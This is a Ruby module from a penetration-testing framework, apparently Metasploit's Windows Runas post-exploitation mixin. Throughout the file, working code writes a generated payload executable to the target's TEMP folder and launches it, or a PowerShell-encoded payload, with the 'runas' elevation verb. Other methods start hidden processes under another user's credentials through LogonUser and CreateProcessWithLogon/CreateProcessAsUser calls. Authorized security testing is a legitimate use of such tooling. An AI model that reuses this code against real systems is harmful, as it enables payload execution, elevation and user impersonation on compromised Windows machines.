# -*- coding: binary -*-

require 'msf/core/exploit/powershell'
require 'msf/core/exploit/exe'

module Msf::Post::Windows::Runas

  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::Powershell
  include Msf::Post::Windows::Error

  ERROR = Msf::Post::Windows::Error
  MAX_PATH = 260
  STARTF_USESHOWWINDOW = 0x00000001
  SW_HIDE = 0

  def shell_execute_exe(filename = nil, path = nil)
    exe_payload = generate_payload_exe
    payload_filename = filename || Rex::Text.rand_text_alpha((rand(8) + 6)) + '.exe'
    payload_path = path || get_env('TEMP')
    cmd_location = "#{payload_path}\\#{payload_filename}"
    print_status("Uploading #{payload_filename} - #{exe_payload.length} bytes to the filesystem...")
    write_file(cmd_location, exe_payload)
    command, args = cmd_location, nil
    shell_exec(command, args)
  end

  def shell_execute_psh
    powershell_command = cmd_psh_payload(payload.encoded, payload_instance.arch.first)
    command = 'cmd.exe'
    args = "/c #{powershell_command}"
    shell_exec(command, args)
  end

  def shell_exec(command, args)
    print_status('Executing Command!')
    session.railgun.shell32.ShellExecuteA(nil, 'runas', command, args, nil, 'SW_SHOW')
    ::Timeout.timeout(30) do
      select(nil, nil, nil, 1) until session_created?
    end
  end

  def startup_info
    # this is start info struct for a hidden process last two params are std out and in.
    #for hidden startup_info[12] = STARTF_USESHOWWINDOW and startup_info[13] = 0 = SW_HIDE
    [0, # cb
     0, # lpReserved
     0, # lpDesktop
     0, # lpTitle
     0, # dwX
     0, # dwY
     0, # dwXSize
     0, # dwYSize
     0, # dwXCountChars
     0, # dwYCountChars
      0, # dwFillAttribute
     STARTF_USESHOWWINDOW, # dwFlags
     SW_HIDE, # wShowWindow
     0, # cbReserved2
     0, # lpReserved2
     0, # hStdInput
     0, # hStdOutput
     0  # hStdError
    ].pack('LLLLLLLLLLLLSSLLLL')
  end

  def create_process_with_logon(domain, user, password, application_name, command_line)
    return unless check_user_format(user, domain)
    return unless check_command_length(application_name, command_line, 1024)

    sysdrive = get_env('SYSTEMDRIVE')
    os = session.sys.config.sysinfo['OS']
    profiles_path = "#{sysdrive}\\Documents and Settings\\" if os =~ /(2000|2003|XP|)/
    profiles_path = "#{sysdrive}\\Users\\"

    # TODO:This should relaly be done ala GetUserProfileDirectory
    # https://msdn.microsoft.com/en-us/library/windows/desktop/ms682431%28v=vs.85%29.aspx
    path = "#{profiles_path}#{user}\\"

    vprint_status("Executing LogonUserW...")
    logon_user = session.railgun.advapi32.LogonUserW(user,
                                                     domain,
                                                     password,
                                                     'LOGON32_LOGON_INTERACTIVE',
                                                     'LOGON32_PROVIDER_DEFAULT',
                                                     4)
    if logon_user['return'] == ERROR::SUCCESS
      vprint_status("Executing CreateProcessWithLogonW...")
      create_process = session.railgun.advapi32.CreateProcessWithLogonW(user,
                                                                        domain,
                                                                        password,
                                                                        'LOGON_WITH_PROFILE',
                                                                        application_name,
                                                                        command_line,
                                                                        'CREATE_UNICODE_ENVIRONMENT',
                                                                        nil,
                                                                        path,
                                                                        startup_info,
                                                                        16)
      if create_process['return'] == ERROR::SUCCESS
        pi = parse_process_information(create_process['lpProcessInformation'])
        print_good("Process started successfully, PID #{pi['process_id']}")
      else
        print_error("Unable to create process, #{create_process['GetLastError']} - #{create_process['ErrorMessage']}")
      end

      pi
    else
      print_error("Unable to login the user, #{logon_user['GetLastError']} - #{logon_user['ErrorMessage']}")
    end

    nil
  end

  def create_process_as_user(domain, user, password, application_name, command_line)
    return unless check_user_format(user, domain)
    return unless check_command_length(application_name, command_line, 32000)

    vprint_status("Executing LogonUserA...")
    logon_user = session.railgun.advapi32.LogonUserA(user,
                                                     domain,
                                                     password,
                                                     'LOGON32_LOGON_INTERACTIVE',
                                                     'LOGON32_PROVIDER_DEFAULT',
                                                     4)

    if logon_user['return'] == ERROR::SUCCESS
      ph_token = logon_user['phToken']
      vprint_status("Executing CreateProcessAsUserA...")
      create_process = session.railgun.advapi32.CreateProcessAsUserA(ph_token,
                                                                    application_name,
                                                                    command_line,
                                                                    nil,
                                                                    nil,
                                                                    false,
                                                                    'CREATE_NEW_CONSOLE',
                                                                    nil,
                                                                    nil,
                                                                    startup_info,
                                                                    16)

      if create_process['return'] == ERROR::SUCCESS
        pi = parse_process_information(create_process['lpProcessInformation'])
        print_good("Process started successfully, PID #{pi['process_id']}")
      else
        print_error("Unable to create process, #{create_process['GetLastError']} - #{create_process['ErrorMessage']}")
      end

      pi
    else
      print_error("Unable to login the user, #{logon_user['GetLastError']} - #{logon_user['ErrorMessage']}")
    end

    nil
  end

  def parse_process_information(process_information)
    pi = process_information.unpack('LLLL')
    { process_handle => pi[0], thread_handle => pi[1], process_id => pi[2], thread_id => pi[3] }
  end

  def check_user_format(username, domain)
    if domain && username.include?('@')
      raise ArgumentError, 'Username is in UPN format (user@domain) so the domain parameter must be nil'
    end

    true
  end

  def check_command_length(application_name, command_line, max_length)
    if application_name.nil? && command_line.nil?
      raise ArgumentError, 'Both application_name and command_line are nil'
    elsif application_name.nil? && command_line.length > MAX_PATH
      raise ArgumentError, "When application_name is nil the command line must be less than MAX_PATH #{MAX_PATH} characters (Currently #{command_line.length})"
    elsif command_line.length > max_length
      raise ArgumentError, "When application_name is set, command line must be less than #{max_length} characters (Currently #{command_line.length})"
    end

    true
  end
end
